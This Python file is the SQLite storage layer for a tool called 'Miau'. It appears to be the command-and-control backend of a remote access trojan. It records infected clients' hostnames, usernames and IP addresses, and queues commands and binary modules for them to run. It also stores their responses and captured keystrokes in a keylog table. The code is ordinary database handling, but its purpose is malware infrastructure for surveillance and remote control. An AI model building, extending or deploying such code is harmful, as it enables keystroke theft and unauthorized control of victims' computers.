"""SQLite store for Miau: clients, tokens/AES keys, commands, responses, logs."""
from __future__ import annotations

import json
import sqlite3
import threading
import time
from pathlib import Path
from typing import Any


_SCHEMA = """
CREATE TABLE IF NOT EXISTS tokens (
    token      TEXT PRIMARY KEY,
    aes_key    BLOB NOT NULL,
    label      TEXT,
    created_at INTEGER NOT NULL,
    last_seen  INTEGER,
    revoked    INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS clients (
    install_id  TEXT PRIMARY KEY,
    token       TEXT NOT NULL,
    hostname    TEXT,
    username    TEXT,
    os          TEXT,
    arch        TEXT,
    client_ver  TEXT,
    pub_ip      TEXT,
    priv_ip     TEXT,
    state       TEXT NOT NULL DEFAULT 'OFFLINE',
    hb_interval INTEGER NOT NULL DEFAULT 15,
    last_seen   INTEGER,
    first_seen  INTEGER,
    metadata    TEXT
);

CREATE TABLE IF NOT EXISTS commands (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    token       TEXT NOT NULL,
    cmd_type    TEXT NOT NULL,
    args        TEXT,
    blob        BLOB,
    issued_at   INTEGER NOT NULL,
    status      TEXT NOT NULL DEFAULT 'QUEUED',
    result_id   INTEGER
);

CREATE TABLE IF NOT EXISTS responses (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    cmd_id      INTEGER NOT NULL,
    status      TEXT NOT NULL,
    message     TEXT,
    data        BLOB,
    final       INTEGER NOT NULL DEFAULT 0,
    created_at  INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS keylogs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    token       TEXT NOT NULL,
    window      TEXT,
    text        TEXT,
    ts          INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS modules (
    name        TEXT PRIMARY KEY,
    version     TEXT,
    binary      BLOB,
    entry       TEXT,
    updated_at  INTEGER NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_tokens_revoked ON tokens(revoked);
CREATE INDEX IF NOT EXISTS idx_clients_state ON clients(state);
CREATE INDEX IF NOT EXISTS idx_commands_token ON commands(token);
CREATE INDEX IF NOT EXISTS idx_responses_cmd ON responses(cmd_id);
"""


class Store:
    def __init__(self, db_path: str | Path = "./miau.db"):
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        self._conn = sqlite3.connect(str(db_path), check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        self._conn.executescript(_SCHEMA)
        self._conn.commit()
        self._lock = threading.RLock()

    # ---------- tokens ----------
    def add_token(self, token: str, aes_key: bytes, label: str = "") -> None:
        with self._lock:
            self._conn.execute(
                "INSERT OR REPLACE INTO tokens(token, aes_key, label, created_at) "
                "VALUES(?,?,?,?)",
                (token, aes_key, label, int(time.time())),
            )
            self._conn.commit()

    def list_tokens(self) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM tokens WHERE revoked=0 ORDER BY created_at DESC"
            ).fetchall()
        return [dict(r) for r in rows]

    def get_token(self, token: str) -> dict[str, Any] | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM tokens WHERE token=? AND revoked=0", (token,)
            ).fetchone()
        return dict(row) if row else None

    def touch_token(self, token: str) -> None:
        with self._lock:
            self._conn.execute(
                "UPDATE tokens SET last_seen=? WHERE token=?", (int(time.time()), token)
            )
            self._conn.commit()

    def revoke_token(self, token: str) -> None:
        with self._lock:
            self._conn.execute("UPDATE tokens SET revoked=1 WHERE token=?", (token,))
            self._conn.commit()

    # ---------- clients ----------
    def upsert_client(self, install_id: str, **fields: Any) -> None:
        allowed = {
            "token", "hostname", "username", "os", "arch",
            "client_ver", "pub_ip", "priv_ip", "state",
            "hb_interval", "last_seen", "first_seen", "metadata",
        }
        data = {k: v for k, v in fields.items() if k in allowed}
        now = int(time.time())
        with self._lock:
            exists = self.get_client(install_id) is not None
            if not exists:
                data.setdefault("first_seen", now)
            data.setdefault("last_seen", now)
            cols = ", ".join(data.keys())
            placeholders = ", ".join("?" for _ in data)
            if exists:
                update = ", ".join(f"{k}=?" for k in data)
                self._conn.execute(
                    f"UPDATE clients SET {update} WHERE install_id=?",
                    (*data.values(), install_id),
                )
            else:
                self._conn.execute(
                    f"INSERT INTO clients(install_id, {cols}) "
                    f"VALUES(?, {placeholders})",
                    (install_id, *data.values()),
                )
            self._conn.commit()

    def get_client(self, install_id: str) -> dict[str, Any] | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM clients WHERE install_id=?", (install_id,)
            ).fetchone()
        return dict(row) if row else None

    def list_clients(self) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM clients ORDER BY last_seen DESC"
            ).fetchall()
        return [dict(r) for r in rows]

    def set_client_state(self, install_id: str, state: str) -> None:
        with self._lock:
            self._conn.execute(
                "UPDATE clients SET state=?, last_seen=? WHERE install_id=?",
                (state, int(time.time()), install_id),
            )
            self._conn.commit()

    def touch_client(self, install_id: str, state: str = "ONLINE") -> None:
        self.set_client_state(install_id, state)

    # ---------- commands / responses ----------
    def enqueue_command(
        self, token: str, cmd_type: str, args: str = "", blob: bytes | None = None
    ) -> int:
        with self._lock:
            cur = self._conn.execute(
                "INSERT INTO commands(token, cmd_type, args, blob, issued_at) "
                "VALUES(?,?,?,?,?)",
                (token, cmd_type, args, blob, int(time.time())),
            )
            self._conn.commit()
            return int(cur.lastrowid)

    def next_commands(self, token: str) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM commands WHERE token=? AND status='QUEUED' "
                "ORDER BY id ASC",
                (token,),
            ).fetchall()
            if rows:
                ids = [r["id"] for r in rows]
                q = ",".join("?" for _ in ids)
                self._conn.execute(
                    f"UPDATE commands SET status='SENT' WHERE id IN ({q})", ids
                )
                self._conn.commit()
        return [dict(r) for r in rows]

    def add_response(
        self, cmd_id: int, status: str, message: str = "",
        data: bytes | None = None, final: int = 1,
    ) -> int:
        with self._lock:
            cur = self._conn.execute(
                "INSERT INTO responses(cmd_id, status, message, data, final, created_at) "
                "VALUES(?,?,?,?,?,?)",
                (cmd_id, status, message, data, final, int(time.time())),
            )
            rid = int(cur.lastrowid)
            self._conn.execute(
                "UPDATE commands SET status=?, result_id=? WHERE id=?",
                ("DONE" if final else "PARTIAL", rid, cmd_id),
            )
            self._conn.commit()
            return rid

    def get_response(self, rid: int) -> dict[str, Any] | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM responses WHERE id=?", (rid,)
            ).fetchone()
        return dict(row) if row else None

    def get_commands_for_client(self, token: str, limit: int = 50) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM commands WHERE token=? ORDER BY id DESC LIMIT ?",
                (token, limit),
            ).fetchall()
        return [dict(r) for r in rows]

    # ---------- keylogs ----------
    def add_keylog(self, token: str, window: str, text: str, ts: int) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT INTO keylogs(token, window, text, ts) VALUES(?,?,?,?)",
                (token, window, text, ts),
            )
            self._conn.commit()

    def list_keylogs(self, token: str, limit: int = 500) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute(
                "SELECT * FROM keylogs WHERE token=? ORDER BY ts DESC LIMIT ?",
                (token, limit),
            ).fetchall()
        return [dict(r) for r in rows]

    # ---------- modules ----------
    def upsert_module(self, name: str, version: str, binary: bytes, entry: str) -> None:
        with self._lock:
            self._conn.execute(
                "INSERT OR REPLACE INTO modules(name, version, binary, entry, updated_at) "
                "VALUES(?,?,?,?,?)",
                (name, version, binary, entry, int(time.time())),
            )
            self._conn.commit()

    def get_module(self, name: str) -> dict[str, Any] | None:
        with self._lock:
            row = self._conn.execute(
                "SELECT * FROM modules WHERE name=?", (name,)
            ).fetchone()
        return dict(row) if row else None

    def list_modules(self) -> list[dict[str, Any]]:
        with self._lock:
            rows = self._conn.execute("SELECT * FROM modules ORDER BY updated_at DESC").fetchall()
        return [dict(r) for r in rows]

    def delete_module(self, name: str) -> None:
        with self._lock:
            self._conn.execute("DELETE FROM modules WHERE name=?", (name,))
            self._conn.commit()

    # ---------- util ----------
    def stats(self) -> dict[str, Any]:
        with self._lock:
            def _one(sql: str) -> int:
                return self._conn.execute(sql).fetchone()[0]
            return {
                "clients": _one("SELECT COUNT(*) FROM clients"),
                "online": _one("SELECT COUNT(*) FROM clients WHERE state='ONLINE'"),
                "commands": _one("SELECT COUNT(*) FROM commands"),
                "responses": _one("SELECT COUNT(*) FROM responses"),
                "keylogs": _one("SELECT COUNT(*) FROM keylogs"),
                "modules": _one("SELECT COUNT(*) FROM modules"),
                "tokens": _one("SELECT COUNT(*) FROM tokens WHERE revoked=0"),
            }
